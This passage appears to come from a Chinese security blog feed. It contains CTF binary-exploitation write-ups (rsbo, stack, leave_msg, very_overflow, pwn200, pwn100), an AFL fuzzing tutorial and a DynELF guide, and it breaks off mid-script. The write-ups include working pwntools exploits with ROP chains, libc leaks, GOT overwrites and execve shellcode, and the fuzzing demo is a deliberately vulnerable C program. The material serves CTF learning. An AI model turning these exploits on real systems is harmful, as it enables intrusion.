还有个坑，在open这里虽然它只需要一个参数，但是它并不只有一个参数，我们要保证它的其实参数为0才能正常调用 exp: 1234567891011121314151617181920212223242526272829303132333435#-*-coding:utf-8from pwn import *context.log_level = 'debug'p = process('./rsbo')# p = remote("hackme.inndy.tw","7706")elf = ELF('./rsbo')open_plt = elf.plt['open']read_plt = elf.plt['read']write_plt = elf.plt['write']main = 0x804867Fstart = 0x08048490flag_addr = 0x80487D0bss = elf.bss()# fd = open("/home/ctf/flag")# read(fd,buf,0x10)# write(1,buf,0x10)#open("/home/ctf/flag")payload_1 = p32(0)*27 + p32(open_plt) + p32(start) + p32(flag_addr) + p32(0)gdb.attach(p,"b *0x804867D")pause()p.send(payload_1)#read(fd,buf,0x10)payload_2 = p32(0)*27 + p32(read_plt) + p32(start)payload_2 += p32(0x3) + p32(bss) + p32(0x60)# gdb.attach(p,"b *0x804867D")# pause()p.send(payload_2)#write(1,buf,0x10)payload_3 = p32(0)*27 + p32(write_plt) + p32(0)payload_3 += p32(1) + p32(bss) + p32(0x60)# gdb.attach(p,"b *0x804867D")# pause()p.send(payload_3)p.interactive() stack这题还是挺有意思的，程序主要做的事就是模拟一个栈的push，pop操作，并将自己模拟的栈放在函数栈帧中， 上图为栈的分布，我们可以看到，自己构造的esp也同样放在栈中，那么我们就可以通过pop,push操作控制esp的位置实现任意地址读，写，思路如下 ： 将esp指向esp所以在位置的上方，push写入改变esp指向libc_start_main+247的位置 pop出libc_start_main+247的值，利用偏移算出system及&quot;/bin/sh&quot;的真实地址 继续控制esp指向main的ret地址位置，修改为system的地址，以及参数&quot;/bin/sh&quot; x 退出即可get shell 好了，接下来详细讲一下过程以及上图是怎么来的 这是IDA反编译出来的东西，我看着是看不出什么有用的信息的，建议看汇编，如果单纯汇编很难看懂的话，可以跟着gdb一步步调试来理解，那我们看汇编 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.text:000006F0 public stack_push.text:000006F0 stack_push proc near ; CODE XREF: main+DC↓p.text:000006F0.text:000006F0 arg_0 = dword ptr 8.text:000006F0 arg_4 = dword ptr 0Ch.text:000006F0.text:000006F0 ; __unwind &#123; .text:000006F0 push ebp.text:000006F1 mov ebp, esp.text:000006F3 ; 4: result = *a1;.text:000006F3 call __x86_get_pc_thunk_ax.text:000006F8 add eax, 18C8h.text:000006FD mov eax, [ebp+arg_0].text:00000700 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000702 ; 5: *a1 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[-254] + 1;.text:00000702 lea ecx, (_GLOBAL_OFFSET_TABLE_+1 - 1FC0h)[eax].text:00000705 mov edx, [ebp+arg_0].text:00000708 mov [edx], ecx.text:0000070A ; 6: a1[result + 1] = a2;.text:0000070A mov edx, [ebp+arg_0].text:0000070D mov ecx, [ebp+arg_4].text:00000710 mov [edx+eax*4+4], ecx.text:00000714 ; 7: return result;.text:00000714 nop.text:00000715 pop ebp.text:00000716 retn----------------------------------------------------------------------------------------------.text:00000717 public stack_pop.text:00000717 stack_pop proc near ; CODE XREF: main+10C↓p.text:00000717.text:00000717 arg_0 = dword ptr 8.text:00000717.text:00000717 ; __unwind &#123;.text:00000717 push ebp.text:00000718 mov ebp, esp.text:0000071A call __x86_get_pc_thunk_ax.text:0000071F add eax, 18A1h.text:00000724 mov eax, [ebp+arg_0].text:00000727 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000729 lea edx, (unk_1FBF - 1FC0h)[eax].text:0000072C mov eax, [ebp+arg_0].text:0000072F mov ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax], edx.text:00000731 mov eax, [ebp+arg_0].text:00000734 mov edx, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000736 mov eax, [ebp+arg_0].text:00000739 mov eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4].text:0000073D pop ebp.text:0000073E retn.text:0000073E ; &#125; // starts at 717.text:0000073E stack_pop endp 可以看到，在进行push操作的时候mov [edx+eax*4+4], ecx是与ecx有关，pop的时候mov eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4]也是跟exc有关，到gdb里看一波 可以看到ecx存的是push的值（我输入的是123=0x7b）eax是与ebp的偏移（将初始esp看成ebp吧），edx是ebp，这里应该就能看出一开始给的图的上半部分了吧 单步一下可以看到我们push的值已经入栈，push的操作明白了我们来看一下pop的操作 因为我们已经先push一个0x7b，所以这次pop指向的就是0xffffcc4c处的0x7b并且esp更新为0(-1)，这就是pop的过程，理清这两个过程就可以来实现上面的4个思路了 首先要修改esp的值就是先将esp指向esp的上方，即0xffffcc44处，初始esp是指向0xffffcc48，所以只需要pop一下就可以了，然后就是修改esp的值 ，用push，修改为多少呢 修改esp指向libc_start_main的位置，也就是0x59 = 89，之后再用pop将地址泄漏出来，进而算出偏移，得到system跟&#39;/bin/sh&#39;的地址，得到地址之后就要找到main函数的返回地址，覆盖为system 我们再往下看多一点栈的内容，回到main，在0x8fb处下个断点，单步往下 看到这个栈帧是不是很熟悉，继续单步到ret处查看栈 对比一下可以很清楚的发现main函数的返回地址是第二个的libc_start_main而不是我们用来泄漏地址的位置，这就是一开始那张图的下半部分了，好了，那开始覆盖：将0xffffcdbc覆盖为system_addr，将0xffffcdc4覆盖为binsh_addr 写入的时候用还是跟泄漏地址时一样的做法，先将esp指向其上方，然后用push压入相应值 不过这里要注意的是，scanf的格式化字符是%d，它能接收的最大值是0x7fffffff而我们要写入的真实地址都是0xf7开头的，明显太大，所以我们要用负数去写，0xffffffff == -1，0xfffffffe == -2这样子就能写入我们要的真实地址了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#-*-coding:utf-8-*-from pwn import *# p = process('./stack')p = remote("hackme.inndy.tw","7716")elf = ELF('./stack')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')context.log_level = 'debug'p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')# 泄漏libc_start_mainp.sendline('i\n89')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Pop -&gt; ')libc_main_addr = (int(p.recvuntil('\n')[:-1],10)&amp;0xffffffff)-247offset = libc_main_addr - libc.symbols['__libc_start_main']system_libc = libc.symbols['system']binsh_libc = libc.search("/bin/sh").next()system_addr = system_libc + offsetbinsh_addr = binsh_libc + offsetlog.info("libc_main_addr --&gt; &#123;&#125;".format(hex(libc_main_addr)))log.info("offset --&gt; &#123;&#125;".format(hex(offset)))log.info("system_addr --&gt; &#123;&#125;".format(hex(system_addr)))log.info("binsh_addr --&gt; &#123;&#125;".format(hex(binsh_addr)))pause()p.recvuntil('Cmd &gt;&gt;\n')p.sendline('c')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')# 写入binshp.sendline('i\n94')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('i')push_binsh = 0xffffffff - binsh_addr+1payload = '-' + str(push_binsh)print payloadp.sendline(payload)# 写入system_addrfor i in range(3): p.recvuntil('Cmd &gt;&gt;\n') p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('i')push_system = 0xffffffff - system_addr + 1payload = '-' + str(push_system)p.sendline(payload)p.recvuntil('Cmd &gt;&gt;\n')p.sendline('x')p.interactive() leave_msg这一题可真是长姿势了呀，主要的知识有： strlen函数遇到&#39;\x00&#39;就会停止计算长度 atoi函数会跳过字符串前面的空格或者换行符，直到遇到数字才进行转换 也是最骚的，got表不一定是写入地址，也可以写入可执行代码（在特定的条件下：比如这一题got表是可执行的，就可以） 其实一开始分析main函数的时候，就发现了改写got表的漏洞，但是因为既加了长度限定，又加了负数检测，一时间就卡住不知如何下手，但其实这几处保护是有缺陷的，这就涉及到了我上面讲到的3点知识，只要我们在8个字符后加&#39;\x00&#39;就可以路过strlen继续往栈输入内容，对于负数检测因为nptr是输入字符串的第一个字符，所以我们只要输入空格+负数，就可以跳这个检测了。接下来就是核心了，因为你会发现虽然可以修改got表了，但是，修改成哪个地址？这处程序既没有后门函数，也没有可泄漏地址的漏洞。 这里可以看到 0x804a000 到 0x804b000 居然是可执行的，这就说明我们可以修改got表为可执行代码了，但是同样有个问题就是，可写的代码长度只有8，所以是无法构造shellcode的，只能进行间接的跳转，而且程序的保护并没有开启NX，所以可以往栈里写入shellcode 然后修改got表为add esp ,*** jmp esp执行shellcode，所以接下来就是要先确定好这个偏移 构造一个&#39;a&#39;*8 + &#39;\x00&#39; + &#39;b&#39;*8这样&#39;a&#39;*8就会写入到puts的got表，整个buf也会写到栈中去，再在下一次的puts处下断点查看偏移：0x0804861d si，进入puts函数内部，这里就可以看到输入的字符相对esp的偏移是0x30，而我们的shellcode是在’\x00’后面，也就是’b’*8，所以got表中的跳转代码就应该是add esp,0x30+len(jmp)+1 ; jmp esp，就可以指向shellcode 了 exp: 12345678910111213141516171819202122232425262728#-*-coding:utf-8-*-from pwn import *# p = process('./leave_msg')p = remote("hackme.inndy.tw","7715")context.log_level = 'debug'# 覆盖printf的got表 -76/4# 覆盖puts的got表 -64/4shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"shellcode_x86 += "\x0b\xcd\x80"jmp = '''add esp,0x36jmp esp'''jmp = asm(jmp)log.info("jmp_len --&gt; &#123;&#125;".format(len(jmp))) #5pause()p.recvuntil("message:\n")payload = jmppayload += '\x00'payload += shellcode_x86# p.sendline("aaaaaaaa\x00bbbbbbbb") # 跟esp的偏移是0x30(+9?就是'bbbbbbbb'跟 esp的偏移)p.sendline(payload)p.recvuntil("slot?\n")# gdb.attach(p,"b *0x8048661")# pause()p.sendline(" -16")p.interactive() very_overflow这题就有意思了，同样是可以实现任意地址读写，不过这次是通过控制结构体的指针来实现，不过这里定义的结构体有点简单，只有指向下一个结构体的指针next和数据data 先add 一个数据进去，在gdb中下断点看一下情况 在这里可以看到结构体在栈中的存储方式是 node-&gt;next node-&gt;data（不明白aa上面为什么是next指针的话，可以再add一个然后查看栈就明白了）而且node-&gt;next = (node + strlen(node-&gt;data) + 5);，所以当add多个node的时候，next跟data是紧挨着排下来的，data跟next中间只隔着一个&#39;\x00&#39;，我一开始在知道这个布局后并没有想到什么有用的利用条件（还是太菜了），但是正常这样紧挨着的布局，使得一种可能：修改node[0]的data从而覆盖node[1]在next达到控制next指针的目的，控制了指向就可以任意地址读写了。 因为show函数会将next指向打印出来，这样就知道了栈地址，计算出node[0]-&gt;next跟libc_start_main的偏移，就可以修改指向通过show将它打印出来，接下来算出system的真实地址用同样的方法写入到返回地址处就行了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./very_overflow')p = remote("hackme.inndy.tw","7705")elf = ELF('./very_overflow')libc = ELF('./libc-2.23.so.i386')# libc = elf.libcp.recvuntil('Your action: ')p.sendline('1')p.recvuntil('Input your note: ')p.sendline('ab')p.recvuntil('Your action: ')p.sendline('1')p.recvuntil('Input your note: ')p.sendline('ab')# 得到node[0]-&gt;next,进而计算出libc_start_main的位置 p.recvuntil('Your action: ')p.sendline('3')p.recvuntil('Which note to show: ')p.sendline('0')p.recvuntil('Next note: ')main_addr = int(p.recv(10),16) + 0x4228ret_addr = main_addr - 0x4228 - 0x2clog.info("point to libc_main --&gt; &#123;&#125;".format(hex(main_addr)))log.info("ret_addr --&gt; &#123;&#125;".format(hex(ret_addr)))# pause()# 修改指针指向libc_start_mainp.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('0')p.recvuntil('Your new data: ')# gdb.attach(p,"b *0x8048705")# pause()p.sendline('aaaa'+p32(main_addr))# show libc_start_mainp.recvuntil('Your action: ')p.sendline('3')p.recvuntil('Which note to show: ')# gdb.attach(p,"b*0x804879c")# pause()p.sendline('2')p.recvuntil('Next note: ')libc_main = int(p.recv(10),16)-247log.info("libc_main --&gt; &#123;&#125;".format(hex(libc_main)))# pause()offset = libc_main - libc.symbols['__libc_start_main']system_addr = offset + libc.symbols['system']binsh_addr = offset + libc.search("/bin/sh").next()log.info("system_addr --&gt; &#123;&#125;".format(hex(system_addr)))log.info("binsh_addr --&gt; &#123;&#125;".format(hex(binsh_addr)))# pause()# 修改指针指向ret地址上一个位置（即将ret地址当作node-&gt;data)p.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('0')p.recvuntil('Your new data: ')# gdb.attach(p,"b *0x8048705")# pause()p.sendline('aaaa'+p32(ret_addr))# 写入p.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('2')p.recvuntil('Your new data: ')payload = p32(system_addr) + 'bbbb' + p32(binsh_addr)# gdb.attach(p,"b *0x8048705")# pause()p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Afl-Fuzz 初探]]></title>
    <url>%2F2020%2F06%2F21%2FFuzz%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[Afl-FuzzAFL(American fuzzy lop)号称是当前最高级的Fuzzing测试工具之一，由谷歌Michal Zalewski所开发。通过对源码编译时进行插桩（简称编译时插桩）的方式自动产生测试用例来探索二进制程序内部新的执行路径；与其它基于插桩技术的fuzz相比，afl-fuzz具有较低的性能消耗，有各种高效的fuzzing策略和tricks最小化技巧，不需要先进行复杂的配置。当然AFL也支持对没有源码的二进制程序进行学习方式，但是需要QEMU的支持。 安装从官网下载最新版的源码，解压后进入目录 123终端中输入以下命令进行安装makesudo make install 如上图就是安装成功了 afl安装的文件中作用分别为： 12345678910afl-gcc和afl-g++ 分别对应 gcc和g++的封装 afl-clang和afl-clang++ 分别对应clang的c和c++的封装afl-fuzz 是AFL的主体，用于对目标程序进行fuzzafl-analyze可以对用例进行分析，通过分析给定的用例，看能否发现用例中有单方的字段 afl-qemu-trace 用于qemu-mode，默认不安装 afl-plot 生成测试任务的状态图afl-tmin 和afl-cmin 对用例进行简化afl-whatsup 用于查看fuzz任务的状态afl-gotcpu 用于查看当前 cpu 状态afl-showmap 用于对单个用例进行执行路径跟踪 白盒测试在有源码的情况下我们可以用afl对源码重新编译时进行插桩 demo 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; int vuln(char *str)&#123; int len = strlen(str); if(str[0] == 'A' &amp;&amp; len == 66) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为A并且长度为66，则异常退出 &#125; else if(str[0] == 'F' &amp;&amp; len == 6) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为F并且长度为6，则异常退出 &#125; else &#123; printf("it is good!\n"); &#125; return 0;&#125;int main(int argc, char *argv[])&#123; char buf[100]=&#123;0&#125;; gets(buf);//存在栈溢出漏洞 printf(buf);//存在格式化字符串漏洞 vuln(buf); return 0;&#125; 插桩编译alf-gcc -g -o afl_demo demo.c，如果是c++源码 就用afl-g++ 接着新建两个文件夹：fuzz_in、fuzz_out，分别 用来存放程序的输入用例和输出 结果 在fuzz_in中还需要创建一个democase文件，这个例子只需要输入一点东西就行了，所以democase就随便写个aaa就行了 在编译项目时，通常会有Makefile，这时需要在Makefile中添加内容： gcc/g++重新编译目标程序的方法是：CC = /path/to/afl/fla-gcc ./configuremake clean all 对于c++程序，则需要设置：CXX=/path/to/afl/afl-g++ afl-clang和afl-clang++的用法类似 开始fuzz在跑fuzz之前需要先设置core_pattern 12sudo su echo core &gt; /proc/sys/kernel/core_pattern 之后 就可以执行afl-fuzz了，通常的格式是： 1afl-fuzz -i testcase_dir -o finding_dir /path/to/program [params] 或者用”@@”替换输入文件，fuzzer 会将其替换为实际执行的文件 1afl-fuzz -i testcast_dir -o finding_dir /path/to/program @@ 123456789PS：常见参数的含义如下 -f:testcase 的内容会作为afl_test的stdin -m:表示分配的内存空间 -i:指定测试样本的路径 -o:指定输出结果的路径 /dev/null 使错误信息不输出到屏幕 -t:设置程序运行超时值，单位为ms -M:运行主(Master) Fuzzer -S:运行从属(Slave) Fuzzer 接下来fuzz开始工作 Fuzz窗口 接下来介绍一下各个模块： 12345process timing:run time :当前fuzzer的运行时间last new path :最近一次发现新路径的时间last uniq crash :最近一次崩溃的时间last uniq hang :最近一次超时的时间 12345overall results:cycles done:总周期数total paths:总路径数uniq crashes:崩溃次数uniq hangs:超时次数 12345stage progress:now trying :正在测试的fuzzing策略stage execs :进度total execs :目标执行总次数exec speed :目标执行速度 需要注意几点： 1、last new path 如果报错，那么要及时修正命令行参数，不然继续fuzz也是徒劳（因为路径是不会改变的）； 2、cycles done 如果变绿了，说明后面即使继续fuzz的意义也不大了，因为出现crash的几率已经很低了，可以选择这个时候停止fuzz 3、uniq crashes 代表的是crash的数量 4、exec speed可以直观地反映当前跑得快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长，这时候就需要进一步调整优化我们的fuzzing 分析crash文件PS：xxd命令的作用是将一个文件以十六进制的形式显示出来 接下来我们看一下刚刚生成的6个carshes 1、看这个数据情况可能是栈溢出 2、满足’F’开头且字符长度为6的异常退出情况 3、栈溢出 4、栈溢出 5、符合格式化字符串漏洞情况 6、符合’A’开头且字符长度为66的异常退出情况 可以用cat将crashes样例输入到程序中检测： 黑盒测试所谓黑盒测试，通俗地讲就是对没有源码的代码进行测试，这时就用到AFL的QEMU模式了； 因为afl-qemu-trace默认不安装 ，所以要先手动安装一波 1234cd qemu_mode./build_qemu_support.shcd ..make install 现在起，只需要添加-Q选项即可使用QEMU模式进行fuzzing 1afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@ 无源码fuzz还是用上面的例子，但是这次用gcc进行编译gcc -o afl_demo2 demo.c，得到afl_demo2后就可以进行fuzz了 同样建立两个文件夹fuzz_in、fuzz_out，执行命令afl-fuzz -i fuzz_in -o fuzz_out -Q ./afl_demo2 可以看到，跟白盒测试时4119/sec的速度，674/sec是没得比的，但是可能是因为我之前跑过一次的原因，这6个crashes还是挺快跑出来的 并行测试如果你有一台多核心的机器 ，可以将一个afl-fuzz绑定到一个对应的核心上，也就是说，机器上有几个核心就可以运行多少afl-fuzz实例，这样可以极大得提高运行速度； 查看机器的核心数cat /proc/cpuinfo | grep &quot;cpu cores&quot; | uniq afl-fuzz并行fuzzing一般的做法是通过 -M 参数指定一个主Fuzzer(Master Fuzzer)、通过 -S 指定多个从Fuzzer(Slave Fuzzer) 123afl-fuzz -i testcases/ -o sync_dir/ -M fuzzer1 -- ./programafl-fuzz -i testcases/ -o sync_dir/ -S fuzzer2 -- ./programafl-fuzz -i testcases/ -o sync_dir/ -S fuzzer3 -- ./program 这两种类型的Fuzzer执行不同的Fuzzing策略，前者进行确定性测试(deterministic),即对输入文件进行一些特殊而非随机的变异；后者进行完全随机的变异 这里可以看到-o指向的是同一个目录，并行测试中所有的Fuzzer相互协作 ，在找到新的代码路径时，相互传递新的测试用例，如下图中以Fuzzer0的角度来看，它查看其它Fuzzer的语料库，并通过比较id来同步感兴趣的测试用例 afl-whatsup可以查看每个fuzzer的运行状态和总体概况，加上-s参数只显示概况，其中的数据 都是所有fuzzer的总和 afl-gotcpu可以查看每个核心的使用状态]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DynELF实现无libc.so泄露函数地址]]></title>
    <url>%2F2020%2F06%2F21%2FDynELF%E5%AE%9E%E7%8E%B0%E6%97%A0libc%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%2F</url>
    <content type="text"><![CDATA[DynELF简介在做漏洞利用的时候，由于ASLR的影响，我们在获取某些函数地址的时候，需要一些特殊操作；一种方法是先泄露出libc.so中的某个函数，然后根据函数之间的偏移，计算我们需要的函数地址，但是这种方法局限于我们需要找到和目标服务器上一样的libc.so，而有些特殊情况下往往找不到对应的libc.so文件；另一种方法就是利用如pwntools的DynELF模块，对内存进行搜索，直到得到我们需要的函数。 官方文档给出了下面的例子： 123456789101112131415161718192021222324252627282930313233343536# Assume a process or remote connectionp = process('./pwnme')# Declare a function that takes a single address, and# leaks at least one byte at that address.def leak(address): data = p.read(address, 4) log.debug("%#x =&gt; %s" % (address, (data or '').encode('hex'))) return data# For the sake of this example, let's say that we# have any of these pointers. One is a pointer into# the target binary, the other two are pointers into libcmain = 0xfeedf4celibc = 0xdeadb000system = 0xdeadbeef# With our leaker, and a pointer into our target binary,# we can resolve the address of anything.## We do not actually need to have a copy of the target# binary for this to work.d = DynELF(leak, main)assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# However, if we *do* have a copy of the target binary,# we can speed up some of the steps.d = DynELF(leak, main, elf=ELF('./pwnme'))assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# Alternately, we can resolve symbols inside another library,# given a pointer into it.d = DynELF(leak, libc + 0x1234)assert d.lookup('system') == system 可以看到需要使用者进行的工作主要集中在leak函数的实现上，通过这个函数可以获取到某个地址上最少1byte的数据 ，然后将这个函数作为参数调用d = DynELF(leak,elf)，该模块的初始化就完成了，然后就可以使用它提供的函数进行内存搜索，得到我们想要的函数地址。 类DynELF的初始化方法如下： 1def __init__(self, leak, pointer=None, elf=None, libcdb=True): leak: leak函数，它是一个pwnlib.memleak.MenLeak实例 pointer: 一个指向 libc 内任意地址的指针 elf: elf 文件 libcdb: 是一个作者收集的libc 库，默认启用以加快搜索 使用条件： 1) 目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间 2) 目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息（同样我们实现的leak函数要能够被循环调用） DynELF 实例在 libc 中，通常使用write、puts、printf函数来打印指定内存的数据 这三个函数中最佳选择当然是write了，因为打印的字节个数全部由write的第三个参数 size 决定，唯一的缺点就是需要传递3个参数，32位程序通过栈传递方便很多，但是64位通过寄存器就麻烦了不少。 这里以xdctf15-pwn200为例 xdctf15-pwn20032位程序，使用write进行打印注释都在脚本上了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#coding:utf-8from pwn import *local = 1DEBUG = 0if DEBUG: context.log_level = 'debug'if local: p = process('./xdctf15-pwn200') elf = ELF('./xdctf15-pwn200')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))start = 0x080483D0vunl_addr = 0x08048484 write_plt = elf.plt['write']read_plt = elf.plt['read']binsh_addr = elf.bss()def leak(addr): pay = 0x70*'a' + p32(write_plt) pay += p32(vunl_addr) pay += p32(1) + p32(addr) + p32(4) sd(pay) data = rc(4) log.info("%#x =&gt; %s" % (addr, (data or '').encode('hex'))) return data'''# 有elf文件 的情况print p.recvline()d = DynELF(leak,elf = ELF('./xdctf15-pwn200'))system = d.lookup('system','libc')show("system_addr",system)# 调用 start 函数恢复栈pay = 0x70*'a' + p32(start)sd(pay)p.recv()ppp_ret = 0x080485cdpay = 0x70*'a' + p32(read_plt)pay += p32(ppp_ret) + p32(0) + p32(binsh_addr) + p32(8)pay += p32(system) + p32(0) + p32(binsh_addr)sd(pay)sleep(0.1)sd('/bin/sh\x00')p.interactive()'''# 没有elf文件的情况print p.recvline()# 当只能leak一个字节时，也是可以的# write_addr = ""# for i in range(4):# write_addr += leak(elf.got['write'] + i)'''write_addr = leak(elf.got['write'])print hex(u32(write_addr))'''d = DynELF(leak,0x8048000)system = d.lookup('system','libc')show("system",system)# 调用 start 函数恢复栈pay = 0x70*'a' + p32(start)sd(pay)p.recv()ppp_ret = 0x080485cdpay = 0x70*'a' + p32(read_plt)pay += p32(ppp_ret) + p32(0) + p32(binsh_addr) + p32(8)pay += p32(system) + p32(0) + p32(binsh_addr)sd(pay)sleep(0.1)sd('/bin/sh\x00')p.interactive() puts函数：使用的参数只有一上，即需要输出数据的起始地址，遇到’\x00’截断，在末尾加上换行符\n，所以puts输出 的数据长度是不容易控制 的，我们无法预料到0截断会在哪里出现；该函数的优点是参数少，在64位程序中很方便使用；缺点就是输出长度不可控，需要在leak函数中做特殊处理； 1、如果puts输出数据后没有接其它字符，我们可以这样写 123456789101112131415161718192021def leak(addr): up = "" content = "" log.info("leak --&gt; %s",hex(addr)) # 调用puts并返回到main的payload，长度视程序而定 pay = 0x48*'A' + p64(pop_rdi) + p64(addr) pay += p64(puts_plt) + p64(main) pay = pay.ljust(0xc8) sd(pay) ru("bye~\n") while True: c = p.recv(numb=1,timeout=0.1) #每次接收一个字符，超时时长为0.1秒 if up == '\n' and c == "": # 因为后方没有其它的字符，所以这里判断，上一个字符为\n且，下一个字符为空是数据接收完成 content = content[:-1] + '\x00' #这里把回车替换成'\x00' break else: content += c up = c content = content[:4] log.info("%#x =&gt; %s" % (addr, (content or '').encode('hex'))) return content 2、puts输出数据后接其它字符 1234567891011121314151617181920def leak(addr): up = "" data = "" # 调用puts并返回到main的payload，长度视程序而定 pay = "a"*0x18 + p64(pppp_ret) pay += p64(pop_rdi) + p64(addr) + p64(elf.plt['puts']) pay += p64(main) sda("RCTF\n",pay) rc(0x1b) while True: c = p.recv(numb=1,timeout=0.1) if up == "\n" and c == "W": # "W"为后方输出字符的首个字符 data = data[:-1] + '\x00' break else: data += c up = c data = data[:8] log.info("%#x =&gt; %s" % (addr, (data or '').encode('hex'))) return data lctf16-pwn10064位程序 ，只有puts函数可以调用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#coding:utf-8from pwn import *local = 1DEBUG = 0if DEBUG: context.log_level = 'debug'if local: p = process('./lctf16-pwn100') elf = ELF('./lctf16-pwn100')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))puts_plt = elf.plt['puts']pop_rdi = 0x400763main = 0x4006B8start = 0x400550def leak(addr): up = "" content = "" log.info("leak --&gt; %s",hex(addr)) pay = 0x48*'A' + p64(pop_rdi) + p64(addr) pay += p64(puts_plt) + p64(main) pay = pay.ljust(0xc8) sd(pay) ru("bye~\n") while True: c = p.recv(numb=1,timeout=0.1) if up == '\n' and c == "": content = content[:-1] + '\x00' #这里把回车替换成'\x00' break else: content += c up = c content = content[:4] log.info("%#x =&gt; %s" % (addr, (content or '').encode('hex'))) return contentd = DynELF(leak,elf = elf)system = d.lookup("system","libc")show("system",system)# read '/bin/sh\x00'pop_addr = 0x40075Amov_call = 0x400740binsh_addr = elf.bss() + 0x100pay = 0x48*'A' + p64(pop_addr)pay += p64(0) + p64(1) + p64(elf.got['read']) + p64(8) + p64(binsh_addr) + p64(0)pay += p64(mov_call)pay += p64(0)*7pay += p64(main)pay = pay.ljust(0xc8)# gdb.attach(p,"b *0x4006AC")sd(pay)sda("bye~\n","/bin/sh\x00")pay = 0x48*'a' + p64(pop_rdi) + p64(binsh_addr) + p64(system)pay = pay.ljust(0xc8)sd(pay)p.interactive() RCTF2015-welpwn64位程序，存在puts和write函数可以调用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#coding:utf-8from pwn import *import syslocal = 1if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./welpwn') elf = ELF('./welpwn')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)pppp_ret = 0x40089Cpop_rdi = 0x4008a3ppp_ret = 0x40089egad1 = 0x40089Agad2 = 0x400880flag = 0main = 0x4007CDdef show(name,addr): log.info(name + " --&gt; %s",hex(addr))'''gdb.attach(p,"b *0x4007CB")pay = "a"*0x18 + p64(pppp_ret) pay += p64(pop_rdi) 